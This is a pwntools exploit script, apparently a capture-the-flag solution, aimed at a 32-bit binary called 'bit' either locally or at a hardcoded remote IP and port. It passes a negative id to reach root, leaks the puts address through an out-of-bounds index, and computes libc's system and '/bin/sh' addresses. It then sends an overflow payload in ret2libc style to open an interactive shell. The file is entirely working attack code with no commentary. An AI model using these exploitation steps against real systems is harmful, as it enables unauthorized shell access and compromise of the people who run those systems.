from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 1
if local:
	cn = process('./bit')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	cn = remote('128.199.135.210', 31335)

def z():
	gdb.attach(cn)
	raw_input()
cn.recv()
cn.sendline('11111111')#pwd
cn.recv()
cn.sendline('-65536')#id->get root

cn.recv()
cn.sendline('127')

cn.recv()
for i in range(127):

	cn.sendline(str(i))
cn.sendline(str(-18))#puts
cn.recvuntil('break\n')
puts = int(cn.recv(),16)
success('puts: '+hex(puts))
cn.sendline('-1')

#one = puts - 0x5fca0 + 0x602b6
system = puts-libc.symbols['puts']+libc.symbols['system']
binsh = puts-libc.symbols['puts']+libc.search('/bin/sh').next()
cn.sendline('0x6fffffff')
cn.recv()

for i in range(21):
	cn.sendline('')
	cn.recvuntil('edit it')

cn.sendline('y')
cn.recvuntil('Enter new value')
cn.sendline(str(0x80488CE))
#z()
cn.sendline(str(-1))
cn.sendline('a'*25 + p32(system) + 'bbbb' + p32(binsh))
cn.interactive()
